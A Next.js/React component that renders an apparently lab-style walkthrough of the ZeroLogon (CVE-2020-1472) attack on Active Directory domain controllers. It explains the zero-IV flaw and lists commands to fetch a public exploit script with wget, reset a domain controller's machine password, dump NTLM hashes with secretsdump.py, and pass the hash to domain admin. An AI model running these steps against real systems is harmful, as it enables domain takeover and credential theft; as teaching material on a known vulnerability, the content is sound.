import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const ZeroLogon = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Zero Logon (CVE-2020-1472) allows an attacker to go from Zero to
              Domain Admin. Zero Logon abuses a poor implementation of
              crytography within MS-NRPC (Microsoft NetLogon Remote Protocol),
              MS-NRPC is a critical authentication component of Active Directory
              that handles authentication for User and Machine account.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              Microsoft chose to use AES-CFB8 for a function called
              ComputeNetlogonCredential, which is normally fine, except they had
              hard coded the Initialization Vector to use all zeros instead of a
              random string. When an attacker sends a message only containing
              zeros with the IV of zero, there is a 1-in-256 chance the
              Ciphertext will be Zero.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Run nmap to get the Domain Controller's Name
            </Typography>
            <Image src="/zerologon.png" width={585} height={259} />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Get this script</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Run the script using the Domain Controller's Name and the IP
              address.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"python zeroLogon-NullPass.py DC01 10.10.209.179"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              The script above changes the Administrator's password to a blank
              value. We can now use secretsdump.py to dump the NTLM password
              hashes.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"secretsdump.py -just-dc -no-pass DC01$@10.10.209.179"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Use pass-the-hash or crack the hash to login as domain admin.
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default ZeroLogon;
